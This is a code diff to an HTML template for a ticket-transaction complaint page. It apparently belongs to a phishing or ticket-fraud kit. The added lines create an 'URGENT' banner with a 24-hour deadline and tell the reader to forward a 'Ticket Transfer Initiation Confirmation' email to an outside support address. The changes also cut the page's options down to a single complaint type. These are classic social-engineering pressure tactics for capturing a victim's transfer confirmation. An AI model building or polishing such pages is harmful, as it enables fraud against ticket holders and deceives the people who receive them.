@@ -219,12 +219,25 @@
             <div class="ticket-id">Transaction #{{ transaction_id }}</div>
         </div>
 
-        <div class="status-banner">
-            <i class="fa fa-info-circle"></i>
+        <div class="status-banner" style="background: #ff5252; border-left: 4px solid #d50000; color: white;">
+            <i class="fa fa-exclamation-triangle"></i>
             <div class="message">
-                <div class="title">Issue with your ticket?</div>
-                <div>Please provide details about the problem you're experiencing with this ticket.</div>
+                <div class="title" style="font-size: 18px; font-weight: 700;">URGENT: Action Required</div>
+                <div><strong>Issue:</strong> Never received the ticket</div>
+                <div><strong>Deadline:</strong> 24 hours to provide proof or automatic refund</div>
             </div>
+        </div>
+        
+        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #e0e0e0;">
+            <h3 style="margin-top: 0; color: #333;">How to Submit Proof:</h3>
+            <ol style="padding-left: 20px; margin-bottom: 15px;">
+                <li>Forward the confirmation email with subject "Ticket Transfer Initiation Confirmation" to <strong>support@safetransaction.com</strong></li>
+                <li>Use subject line: "Complaint: Transaction #{{ transaction_id }}"</li>
+                <li>Include any additional details in the email body</li>
+            </ol>
+            <a href="mailto:support@safetransaction.com?subject=Complaint: Transaction %23{{ transaction_id }}" class="btn btn-primary" style="background: #4a6cf7; display: inline-block; margin-top: 10px; text-decoration: none;">
+                <i class="fa fa-envelope"></i> Send Proof Now
+            </a>
         </div>
 
         <div class="event-details">
@@ -257,19 +270,7 @@
                 <label>What type of problem are you experiencing?</label>
                 
                 <label class="problem-type">
-                    <input type="radio" name="problem_type" value="wrong_ticket" required>
-                    <div class="problem-type-title">Wrong ticket information</div>
-                    <div class="problem-type-desc">The ticket details don't match what was advertised. Please forward your ticket to <strong>ticketswap@gmail.com</strong> with the email where the ticket was transferred.</div>
-                </label>
-                
-                <label class="problem-type">
-                    <input type="radio" name="problem_type" value="invalid_ticket">
-                    <div class="problem-type-title">Invalid ticket</div>
-                    <div class="problem-type-desc">The ticket appears to be invalid or already used</div>
-                </label>
-                
-                <label class="problem-type">
-                    <input type="radio" name="problem_type" value="no_ticket">
+                    <input type="radio" name="problem_type" value="no_ticket" required>
                     <div class="problem-type-title">No ticket received</div>
                     <div class="problem-type-desc">I haven't received any ticket information from the seller</div>
                 </label>
